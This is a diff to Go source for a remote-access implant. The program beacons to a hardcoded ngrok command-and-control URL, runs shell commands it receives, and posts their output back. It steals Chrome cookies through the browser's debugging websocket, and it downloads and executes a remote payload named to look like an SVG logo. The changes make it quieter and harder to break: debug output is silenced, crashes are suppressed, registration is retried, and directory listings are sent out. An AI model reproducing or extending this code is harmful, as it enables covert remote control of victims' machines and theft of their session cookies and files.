@@ -63,7 +63,7 @@ type Cmd struct {
 	Output  string
 }
 
-var timeoutSetting = 3
+var timeoutSetting = 1
 var c2 = "https://e49a4a48f45d.ngrok.io"
 
 //var agent = "test"
@@ -72,7 +72,13 @@ func main() {
 	uuid := shortuuid.New()
 	user, err := user.Current()
 	agent := uuid + "_" + user.Uid + "_" + user.Name
-	createAgent(agent)
+	for {
+		time.Sleep(3 * time.Second)
+		status := createAgent(agent)
+		if status == "200 OK" {
+			break
+		}
+	}
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 	}
@@ -82,11 +88,9 @@ func main() {
 	for {
 		select {
 		case <-ticker.C:
-			path, err := os.Getwd()
 			if err != nil {
 				fmt.Fprintln(os.Stderr, err)
 			}
-			fmt.Println(path)
 			getJSON(c2 + "/api/cmds/" + agent)
 			updateAgentStatus(agent)
 		case <-quit:
@@ -107,17 +111,17 @@ func getJSON(url string) {
 
 	body, readErr := ioutil.ReadAll(resp.Body)
 	if readErr != nil {
-		log.Fatal(readErr)
+		fmt.Println(readErr)
 	}
 
 	var results []Cmd
 	jsonErr := json.Unmarshal(body, &results)
 	if jsonErr != nil {
-		log.Fatal(jsonErr)
+		fmt.Println(jsonErr)
 	}
 
 	for _, d := range results {
-		fmt.Println(d.Command)
+		//fmt.Println(d.Command)
 		fmt.Println(d.Cmdid)
 		runCommand(d.Command, d.Cmdid)
 	}
@@ -152,17 +156,23 @@ func runCommand(commandStr string, cmdid string) error {
 	case "cookies":
 		killChrome()
 		time.Sleep(5 * time.Second)
+		killChrome()
+		time.Sleep(5 * time.Second)
 		execScript(cmdid, "/tmp/grabCookies.js")
 		time.Sleep(5 * time.Second)
 		getChromeWSS("http://127.0.0.1:9222/json")
+	case "download":
+		fmt.Println("Downloading file")
 	default:
 		out, err := exec.Command(arrCommandStr[0], arrCommandStr[1:]...).Output()
 		if err != nil {
 			fmt.Println(err)
+			updateCmdStatus(cmdid, err.Error())
+			return nil
 		}
 		//cmd.Stderr = os.Stderr
 		//cmd.Stdout = os.Stdout
-		fmt.Println(string(out))
+		//fmt.Println(string(out))
 		updateCmdStatus(cmdid, string(out))
 		return nil
 	}
@@ -174,7 +184,7 @@ func updateCmdStatus(cmdid string, output string) {
 		url.Values{"id": {cmdid}, "output": {output}})
 
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	if resp.Body != nil {
 		defer resp.Body.Close()
@@ -184,28 +194,43 @@ func updateCmdStatus(cmdid string, output string) {
 func updateAgentStatus(agent string) {
 	timestamp := strconv.FormatInt(time.Now().UTC().UnixNano(), 10)
 	dir, err := os.Getwd()
+	names := make([]string, 0)
+	files, _ := ioutil.ReadDir(dir)
+	for _, f := range files {
+		names = append(names, f.Name())
+	}
+	fnames := strings.Join(names, ",")
 	resp, err := http.PostForm(c2+"/api/agent/update",
-		url.Values{"working": {dir}, "agent": {agent}, "checkIn": {timestamp}})
+		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}, "checkIn": {timestamp}})
 
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	if resp.Body != nil {
 		defer resp.Body.Close()
 	}
 }
 
-func createAgent(agent string) {
+func createAgent(agent string) string {
 	dir, err := os.Getwd()
+	names := make([]string, 0)
+	files, _ := ioutil.ReadDir(dir)
+	for _, f := range files {
+		names = append(names, f.Name())
+	}
+	fnames := strings.Join(names, ",")
+	fmt.Println("Files: " + fnames)
 	resp, err := http.PostForm(c2+"/api/agent/create",
-		url.Values{"working": {dir}, "agent": {agent}})
+		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}})
 
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	if resp.Body != nil {
 		defer resp.Body.Close()
 	}
+	fmt.Println(resp.Status)
+	return resp.Status
 }
 
 func downloadFile(filepath string, url string) error {
@@ -258,9 +283,9 @@ func runJXA(url string, cmdid string) {
 	fileURL := url
 	err := downloadFile("/tmp/logo.svg", fileURL)
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
-	fmt.Println("Downloaded: " + fileURL)
+	//fmt.Println("Downloaded: " + fileURL)
 
 	execScript(cmdid, "/tmp/logo.svg")
 }
@@ -273,7 +298,7 @@ func execScript(cmdid string, path string) string {
 	cmd.Stdout = &out
 	cmd.Stderr = &stderr
 	cmd.Run()
-	fmt.Println("Result: " + out.String())
+	//fmt.Println("Result: " + out.String())
 	updateCmdStatus(cmdid, stderr.String())
 	return ""
 
@@ -283,7 +308,7 @@ func websox(addr string) {
 
 	c, _, err := websocket.DefaultDialer.Dial(addr, nil)
 	if err != nil {
-		log.Fatal("dial:", err)
+		fmt.Println(err)
 	}
 	defer c.Close()
 
@@ -311,13 +336,13 @@ func websox(addr string) {
 
 			f, err := os.OpenFile("/tmp/dat2", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 			if err != nil {
-				panic(err)
+				fmt.Println(err)
 			}
 
 			defer f.Close()
 
 			if _, err = f.WriteString(string(mapB)); err != nil {
-				panic(err)
+				fmt.Println(err)
 			}
 
 		}
@@ -333,13 +358,13 @@ func websox(addr string) {
 
 			f, err := os.OpenFile("/tmp/dat2", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 			if err != nil {
-				panic(err)
+				fmt.Println(err)
 			}
 
 			defer f.Close()
 
 			if _, err = f.WriteString(string(mapB)); err != nil {
-				panic(err)
+				fmt.Println(err)
 			}
 
 		}
@@ -361,7 +386,7 @@ func getChromeWSS(url string) string {
 
 	resp, err := http.Get(url)
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	if resp.Body != nil {
 		defer resp.Body.Close()
@@ -369,13 +394,13 @@ func getChromeWSS(url string) string {
 
 	body, readErr := ioutil.ReadAll(resp.Body)
 	if readErr != nil {
-		log.Fatal(readErr)
+		fmt.Println(readErr)
 	}
 
 	var results []Pages
 	jsonErr := json.Unmarshal(body, &results)
 	if jsonErr != nil {
-		log.Fatal(jsonErr)
+		fmt.Println(jsonErr)
 	}
 
 	for _, d := range results {
